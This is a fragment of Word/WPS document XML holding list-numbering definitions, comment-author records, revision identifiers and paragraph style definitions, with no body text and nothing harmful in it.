    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="none"/>
      <w:pStyle w:val="1"/>
      <w:lvlText w:val="2."/>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4" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="02866DD4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F24E2AD0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1282" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%2."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1722" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2162" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2602" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3042" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3482" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3922" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4362" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4802" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="05CD477F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="05CD477F"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimalEnclosedCircle"/>
      <w:lvlText w:val="%1"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="842" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%2)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1362" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%3."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="1802" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%4."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2242" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%5)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2682" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%6."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="3122" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:lvlText w:val="%7."/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3562" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerLetter"/>
      <w:lvlText w:val="%8)"/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4002" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="lowerRoman"/>
      <w:lvlText w:val="%9."/>
      <w:lvlJc w:val="right"/>
      <w:pPr>
        <w:ind w:left="4442" w:hanging="440"/>
      </w:pPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="09E65CC2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="09E65CC2"/>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7" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="1D24324B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1D24324B"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="1722" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2162" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="2602" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3042" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3482" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="3922" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4362" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="4802" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:ind w:left="5242" w:hanging="440"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="8" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="35F53B8A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="35F53B8A"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimalEnclosedCircle"/>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9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6213396F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6213396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459540915">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1122960034">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1257254450">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="867376717">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2059428113">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="1996104197">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1178351801">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="322198218">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1509712114">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1809755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青风明月-崔剑">
    <w15:presenceInfo w15:providerId="None" w15:userId="青风明月-崔剑"/>
  </w15:person>
  <w15:person w15:author="zhao ruizhi">
    <w15:presenceInfo w15:providerId="Windows Live" w15:userId="82544d48ebd19093"/>
  </w15:person>
  <w15:person w15:author="20230103115259">
    <w15:presenceInfo w15:providerId="None" w15:userId="20230103115259"/>
  </w15:person>
  <w15:person w15:author="804242129@qq.com">
    <w15:presenceInfo w15:providerId="Windows Live" w15:userId="d78e85898e40db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M2NjU0ZDI2YWNhZmE1NDk2ZTFmYjkyYWY4NzU0YzkifQ=="/>
    <w:docVar w:name="KSO_WPS_MARK_KEY" w:val="69c275e6-2f12-4ee9-80d8-1bc4159bb1f4"/>
  </w:docVars>
  <w:rsids>
    <w:rsidRoot w:val="00D85F06"/>
    <w:rsid w:val="9BEF45F9"/>
    <w:rsid w:val="9D799E8B"/>
    <w:rsid w:val="B61BD381"/>
    <w:rsid w:val="B7DC70CD"/>
    <w:rsid w:val="BF6F525E"/>
    <w:rsid w:val="BF8D373F"/>
    <w:rsid w:val="BF9BC45A"/>
    <w:rsid w:val="BFBBD517"/>
    <w:rsid w:val="BFFFC0B9"/>
    <w:rsid w:val="C9D9C887"/>
    <w:rsid w:val="DAFD7291"/>
    <w:rsid w:val="DC6935EB"/>
    <w:rsid w:val="DCDFA37C"/>
    <w:rsid w:val="DCFF6447"/>
    <w:rsid w:val="DF7B963A"/>
    <w:rsid w:val="DFF7E1A2"/>
    <w:rsid w:val="F45A8FB5"/>
    <w:rsid w:val="F5FF68DD"/>
    <w:rsid w:val="F77E823C"/>
    <w:rsid w:val="F7E8899B"/>
    <w:rsid w:val="FB6328FB"/>
    <w:rsid w:val="FCD5E99F"/>
    <w:rsid w:val="FDF796D8"/>
    <w:rsid w:val="FEF7315C"/>
    <w:rsid w:val="FFB719A1"/>
    <w:rsid w:val="FFF6E060"/>
    <w:rsid w:val="00013689"/>
    <w:rsid w:val="00027216"/>
    <w:rsid w:val="00033851"/>
    <w:rsid w:val="00034741"/>
    <w:rsid w:val="00041144"/>
    <w:rsid w:val="0004458B"/>
    <w:rsid w:val="000468E6"/>
    <w:rsid w:val="0007142C"/>
    <w:rsid w:val="000744CC"/>
    <w:rsid w:val="00080D2C"/>
    <w:rsid w:val="000B192E"/>
    <w:rsid w:val="000B6A7C"/>
    <w:rsid w:val="000C4CCF"/>
    <w:rsid w:val="000D54C7"/>
    <w:rsid w:val="000D5F9B"/>
    <w:rsid w:val="000D6EDA"/>
    <w:rsid w:val="000E0BB4"/>
    <w:rsid w:val="000E5583"/>
    <w:rsid w:val="000F59E1"/>
    <w:rsid w:val="001110C2"/>
    <w:rsid w:val="0013327B"/>
    <w:rsid w:val="0016155C"/>
    <w:rsid w:val="00165B16"/>
    <w:rsid w:val="0017286D"/>
    <w:rsid w:val="00185742"/>
    <w:rsid w:val="00187D8B"/>
    <w:rsid w:val="00193960"/>
    <w:rsid w:val="00193C1A"/>
    <w:rsid w:val="001A495F"/>
    <w:rsid w:val="001C5C86"/>
    <w:rsid w:val="001D3D81"/>
    <w:rsid w:val="001F01B6"/>
    <w:rsid w:val="001F1552"/>
    <w:rsid w:val="001F320C"/>
    <w:rsid w:val="001F5912"/>
    <w:rsid w:val="00216F0B"/>
    <w:rsid w:val="00223F7A"/>
    <w:rsid w:val="00234558"/>
    <w:rsid w:val="002504F3"/>
    <w:rsid w:val="00274DB4"/>
    <w:rsid w:val="00276B3B"/>
    <w:rsid w:val="00291AD1"/>
    <w:rsid w:val="002931C8"/>
    <w:rsid w:val="00296908"/>
    <w:rsid w:val="002A6909"/>
    <w:rsid w:val="002B05DC"/>
    <w:rsid w:val="002B2126"/>
    <w:rsid w:val="002B5C97"/>
    <w:rsid w:val="002C620D"/>
    <w:rsid w:val="002E580B"/>
    <w:rsid w:val="00323756"/>
    <w:rsid w:val="00331192"/>
    <w:rsid w:val="00334997"/>
    <w:rsid w:val="003579F1"/>
    <w:rsid w:val="003617AF"/>
    <w:rsid w:val="00372E82"/>
    <w:rsid w:val="00374634"/>
    <w:rsid w:val="00383F30"/>
    <w:rsid w:val="00384A0B"/>
    <w:rsid w:val="00392D41"/>
    <w:rsid w:val="00392EC5"/>
    <w:rsid w:val="00394A7A"/>
    <w:rsid w:val="003C236E"/>
    <w:rsid w:val="003D120E"/>
    <w:rsid w:val="003E0230"/>
    <w:rsid w:val="00402E61"/>
    <w:rsid w:val="0041094C"/>
    <w:rsid w:val="00412E32"/>
    <w:rsid w:val="00436EFC"/>
    <w:rsid w:val="0044362E"/>
    <w:rsid w:val="00445E83"/>
    <w:rsid w:val="00456F3E"/>
    <w:rsid w:val="00462602"/>
    <w:rsid w:val="00466CD9"/>
    <w:rsid w:val="0047249A"/>
    <w:rsid w:val="00484F16"/>
    <w:rsid w:val="00490737"/>
    <w:rsid w:val="00494F07"/>
    <w:rsid w:val="004B1D7D"/>
    <w:rsid w:val="004C21B1"/>
    <w:rsid w:val="004C5535"/>
    <w:rsid w:val="004E0D77"/>
    <w:rsid w:val="00515977"/>
    <w:rsid w:val="00555A08"/>
    <w:rsid w:val="005675BC"/>
    <w:rsid w:val="00575A11"/>
    <w:rsid w:val="00581D80"/>
    <w:rsid w:val="0059144F"/>
    <w:rsid w:val="00592F1D"/>
    <w:rsid w:val="005A1E77"/>
    <w:rsid w:val="005A5747"/>
    <w:rsid w:val="005A6675"/>
    <w:rsid w:val="005B6DF4"/>
    <w:rsid w:val="005C20DF"/>
    <w:rsid w:val="005C5CD7"/>
    <w:rsid w:val="005D0672"/>
    <w:rsid w:val="005E5AA2"/>
    <w:rsid w:val="0061009B"/>
    <w:rsid w:val="00612986"/>
    <w:rsid w:val="00624750"/>
    <w:rsid w:val="006379CD"/>
    <w:rsid w:val="00650EEC"/>
    <w:rsid w:val="00651FCF"/>
    <w:rsid w:val="0065616D"/>
    <w:rsid w:val="0066210F"/>
    <w:rsid w:val="00666BB5"/>
    <w:rsid w:val="006809B9"/>
    <w:rsid w:val="00681DF2"/>
    <w:rsid w:val="00687DAC"/>
    <w:rsid w:val="00690A02"/>
    <w:rsid w:val="006A4F3B"/>
    <w:rsid w:val="006B061C"/>
    <w:rsid w:val="006B7BA8"/>
    <w:rsid w:val="006C5266"/>
    <w:rsid w:val="006D430C"/>
    <w:rsid w:val="006E775A"/>
    <w:rsid w:val="006F5A05"/>
    <w:rsid w:val="00703848"/>
    <w:rsid w:val="00704000"/>
    <w:rsid w:val="007147B7"/>
    <w:rsid w:val="0075189A"/>
    <w:rsid w:val="00756A97"/>
    <w:rsid w:val="00761B6B"/>
    <w:rsid w:val="00777B51"/>
    <w:rsid w:val="00784930"/>
    <w:rsid w:val="00791FBE"/>
    <w:rsid w:val="00794B53"/>
    <w:rsid w:val="007B32EC"/>
    <w:rsid w:val="007B71EA"/>
    <w:rsid w:val="007D617F"/>
    <w:rsid w:val="007E1328"/>
    <w:rsid w:val="007F0A30"/>
    <w:rsid w:val="008015F7"/>
    <w:rsid w:val="00814309"/>
    <w:rsid w:val="00824864"/>
    <w:rsid w:val="00827672"/>
    <w:rsid w:val="00841724"/>
    <w:rsid w:val="00846E5B"/>
    <w:rsid w:val="00847A35"/>
    <w:rsid w:val="00862F76"/>
    <w:rsid w:val="00866166"/>
    <w:rsid w:val="008730BA"/>
    <w:rsid w:val="00873EC7"/>
    <w:rsid w:val="008755DC"/>
    <w:rsid w:val="0089089F"/>
    <w:rsid w:val="008A1B32"/>
    <w:rsid w:val="008C2040"/>
    <w:rsid w:val="008C3743"/>
    <w:rsid w:val="008D5CE7"/>
    <w:rsid w:val="008F4273"/>
    <w:rsid w:val="008F53E5"/>
    <w:rsid w:val="00901ACC"/>
    <w:rsid w:val="009114C5"/>
    <w:rsid w:val="009246B5"/>
    <w:rsid w:val="009334EC"/>
    <w:rsid w:val="009367A6"/>
    <w:rsid w:val="00971405"/>
    <w:rsid w:val="009A12CE"/>
    <w:rsid w:val="009B1A4E"/>
    <w:rsid w:val="009B5821"/>
    <w:rsid w:val="009E53F3"/>
    <w:rsid w:val="009E7B17"/>
    <w:rsid w:val="009F5812"/>
    <w:rsid w:val="00A00E94"/>
    <w:rsid w:val="00A12BF0"/>
    <w:rsid w:val="00A4417A"/>
    <w:rsid w:val="00A7421E"/>
    <w:rsid w:val="00AA7D8E"/>
    <w:rsid w:val="00AB3481"/>
    <w:rsid w:val="00AB4096"/>
    <w:rsid w:val="00AC4EEB"/>
    <w:rsid w:val="00AD1BFB"/>
    <w:rsid w:val="00AE09B6"/>
    <w:rsid w:val="00AE0A08"/>
    <w:rsid w:val="00B17E3F"/>
    <w:rsid w:val="00B2035D"/>
    <w:rsid w:val="00B2370A"/>
    <w:rsid w:val="00B2618F"/>
    <w:rsid w:val="00B366C6"/>
    <w:rsid w:val="00B41BEB"/>
    <w:rsid w:val="00B51F87"/>
    <w:rsid w:val="00B52F68"/>
    <w:rsid w:val="00B6368D"/>
    <w:rsid w:val="00B76A0B"/>
    <w:rsid w:val="00BA0829"/>
    <w:rsid w:val="00BB7608"/>
    <w:rsid w:val="00BC324D"/>
    <w:rsid w:val="00BE3C5F"/>
    <w:rsid w:val="00BE5465"/>
    <w:rsid w:val="00BE7C2F"/>
    <w:rsid w:val="00C010AA"/>
    <w:rsid w:val="00C16DA6"/>
    <w:rsid w:val="00C2183C"/>
    <w:rsid w:val="00C258CD"/>
    <w:rsid w:val="00C31A4C"/>
    <w:rsid w:val="00C373C7"/>
    <w:rsid w:val="00C55B01"/>
    <w:rsid w:val="00C73682"/>
    <w:rsid w:val="00C81848"/>
    <w:rsid w:val="00C85504"/>
    <w:rsid w:val="00C902BF"/>
    <w:rsid w:val="00C93B9A"/>
    <w:rsid w:val="00C973F3"/>
    <w:rsid w:val="00CA10C8"/>
    <w:rsid w:val="00CB28E4"/>
    <w:rsid w:val="00CB54AB"/>
    <w:rsid w:val="00CB6672"/>
    <w:rsid w:val="00CD1286"/>
    <w:rsid w:val="00CD36AB"/>
    <w:rsid w:val="00CD3914"/>
    <w:rsid w:val="00CE0E87"/>
    <w:rsid w:val="00CE6A47"/>
    <w:rsid w:val="00CF69ED"/>
    <w:rsid w:val="00D10C57"/>
    <w:rsid w:val="00D40ABA"/>
    <w:rsid w:val="00D41059"/>
    <w:rsid w:val="00D74129"/>
    <w:rsid w:val="00D85F06"/>
    <w:rsid w:val="00DB59A9"/>
    <w:rsid w:val="00DC47B0"/>
    <w:rsid w:val="00DC63C5"/>
    <w:rsid w:val="00DC6E8C"/>
    <w:rsid w:val="00DD3C8E"/>
    <w:rsid w:val="00DE6B6D"/>
    <w:rsid w:val="00DF341A"/>
    <w:rsid w:val="00E01A68"/>
    <w:rsid w:val="00E3032C"/>
    <w:rsid w:val="00E329E8"/>
    <w:rsid w:val="00E345C1"/>
    <w:rsid w:val="00E4662E"/>
    <w:rsid w:val="00E4696D"/>
    <w:rsid w:val="00E75072"/>
    <w:rsid w:val="00E82288"/>
    <w:rsid w:val="00E86010"/>
    <w:rsid w:val="00E86C26"/>
    <w:rsid w:val="00E90014"/>
    <w:rsid w:val="00E94735"/>
    <w:rsid w:val="00EA0595"/>
    <w:rsid w:val="00EC0211"/>
    <w:rsid w:val="00EC0C2A"/>
    <w:rsid w:val="00EC4518"/>
    <w:rsid w:val="00EC6F20"/>
    <w:rsid w:val="00F17F49"/>
    <w:rsid w:val="00F23EB0"/>
    <w:rsid w:val="00F5405D"/>
    <w:rsid w:val="00F54C68"/>
    <w:rsid w:val="00F82DB2"/>
    <w:rsid w:val="00F864C3"/>
    <w:rsid w:val="00F91A3B"/>
    <w:rsid w:val="00FB1BF3"/>
    <w:rsid w:val="00FC45D9"/>
    <w:rsid w:val="00FD568D"/>
    <w:rsid w:val="04A90773"/>
    <w:rsid w:val="099D4776"/>
    <w:rsid w:val="0F6C2DDE"/>
    <w:rsid w:val="121F3E0E"/>
    <w:rsid w:val="14BB0539"/>
    <w:rsid w:val="17B81B8D"/>
    <w:rsid w:val="182F635D"/>
    <w:rsid w:val="18B82205"/>
    <w:rsid w:val="19CE1A9A"/>
    <w:rsid w:val="1B006F4A"/>
    <w:rsid w:val="1BDD714C"/>
    <w:rsid w:val="1CE210D9"/>
    <w:rsid w:val="1ED80E47"/>
    <w:rsid w:val="1FB7318B"/>
    <w:rsid w:val="20BB1198"/>
    <w:rsid w:val="20C4455A"/>
    <w:rsid w:val="21724C54"/>
    <w:rsid w:val="21A13FA0"/>
    <w:rsid w:val="22043138"/>
    <w:rsid w:val="2A3644B8"/>
    <w:rsid w:val="2AB976C5"/>
    <w:rsid w:val="2ED3236C"/>
    <w:rsid w:val="30C33866"/>
    <w:rsid w:val="33371B48"/>
    <w:rsid w:val="35E9781C"/>
    <w:rsid w:val="373B6744"/>
    <w:rsid w:val="38EB7F8C"/>
    <w:rsid w:val="3AF5FF14"/>
    <w:rsid w:val="3B7FC95A"/>
    <w:rsid w:val="3CCF005B"/>
    <w:rsid w:val="3EFE758A"/>
    <w:rsid w:val="3F3B8889"/>
    <w:rsid w:val="40AF1FD5"/>
    <w:rsid w:val="420E3561"/>
    <w:rsid w:val="42497C52"/>
    <w:rsid w:val="43596921"/>
    <w:rsid w:val="43664D06"/>
    <w:rsid w:val="44D538A0"/>
    <w:rsid w:val="44F00B6E"/>
    <w:rsid w:val="468D34AC"/>
    <w:rsid w:val="475D1BA0"/>
    <w:rsid w:val="479005B3"/>
    <w:rsid w:val="481748C2"/>
    <w:rsid w:val="48A1761E"/>
    <w:rsid w:val="4BFF5B3B"/>
    <w:rsid w:val="4E3C23B4"/>
    <w:rsid w:val="4F7B54C6"/>
    <w:rsid w:val="51BC1CFE"/>
    <w:rsid w:val="53AA7013"/>
    <w:rsid w:val="5444378D"/>
    <w:rsid w:val="5463310B"/>
    <w:rsid w:val="567F7A46"/>
    <w:rsid w:val="56CF2B79"/>
    <w:rsid w:val="59146E0B"/>
    <w:rsid w:val="59613582"/>
    <w:rsid w:val="5BF927F5"/>
    <w:rsid w:val="5DDF9DA3"/>
    <w:rsid w:val="5E577C68"/>
    <w:rsid w:val="5EE5D540"/>
    <w:rsid w:val="5FAD695F"/>
    <w:rsid w:val="60E546BC"/>
    <w:rsid w:val="625E63AF"/>
    <w:rsid w:val="63194AD9"/>
    <w:rsid w:val="635F05E8"/>
    <w:rsid w:val="63D16508"/>
    <w:rsid w:val="63E512CB"/>
    <w:rsid w:val="67F7A81B"/>
    <w:rsid w:val="69F152F1"/>
    <w:rsid w:val="6DAC4286"/>
    <w:rsid w:val="6DDFA7B5"/>
    <w:rsid w:val="6DE94229"/>
    <w:rsid w:val="6E552293"/>
    <w:rsid w:val="6F6E532A"/>
    <w:rsid w:val="70CE6711"/>
    <w:rsid w:val="720C74CA"/>
    <w:rsid w:val="726F0579"/>
    <w:rsid w:val="72854E7D"/>
    <w:rsid w:val="730A3023"/>
    <w:rsid w:val="739B9362"/>
    <w:rsid w:val="75D7FE5B"/>
    <w:rsid w:val="75E7DC2E"/>
    <w:rsid w:val="76201532"/>
    <w:rsid w:val="762F5E2D"/>
    <w:rsid w:val="77DF8635"/>
    <w:rsid w:val="7AA21EC4"/>
    <w:rsid w:val="7BCEDCEB"/>
    <w:rsid w:val="7D2D756F"/>
    <w:rsid w:val="7D5F570B"/>
    <w:rsid w:val="7E4B683A"/>
    <w:rsid w:val="7EDF2A5C"/>
    <w:rsid w:val="7F3DE0B0"/>
    <w:rsid w:val="7F97112A"/>
    <w:rsid w:val="7FEEB726"/>
    <w:rsid w:val="7FF9BFFF"/>
    <w:rsid w:val="7FFEDB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9B93C0B"/>
  <w15:docId w15:val="{EA11444B-F2FF-461B-85AD-87A3F4550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unhideWhenUsed="1" w:qFormat="1"/>
    <w:lsdException w:name="annotation reference" w:qFormat="1"/>
    <w:lsdException w:name="Title" w:qFormat="1"/>
    <w:lsdException w:name="Default Paragraph Font" w:uiPriority="1" w:unhideWhenUsed="1"/>
    <w:lsdException w:name="Body Text" w:uiPriority="1"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HTML Typewriter"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numPr>
        <w:numId w:val="1"/>
      </w:numPr>
      <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:b/>
      <w:bCs/>
      <w:kern w:val="44"/>
      <w:sz w:val="28"/>
      <w:szCs w:val="44"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="2">
    <w:name w:val="heading 2"/>
    <w:basedOn w:val="a"/>
    <w:next w:val="a"/>
    <w:semiHidden/>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annotation text"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="a5"/>
    <w:qFormat/>
    <w:pPr>
      <w:jc w:val="left"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a6">
    <w:name w:val="Body Text"/>
    <w:basedOn w:val="a"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rPr>
      <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:cs="宋体"/>
      <w:sz w:val="24"/>
      <w:lang w:eastAsia="en-US" w:bidi="en-US"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a7">
    <w:name w:val="footer"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="a8"/>
    <w:qFormat/>
    <w:pPr>
      <w:tabs>
        <w:tab w:val="center" w:pos="4153"/>
        <w:tab w:val="right" w:pos="8306"/>
      </w:tabs>
      <w:snapToGrid w:val="0"/>
      <w:jc w:val="left"/>
    </w:pPr>
    <w:rPr>
      <w:sz w:val="18"/>
      <w:szCs w:val="18"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="a9">
    <w:name w:val="header"/>
    <w:basedOn w:val="a"/>
    <w:link w:val="aa"/>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b">
    <w:name w:val="Normal (Web)"/>
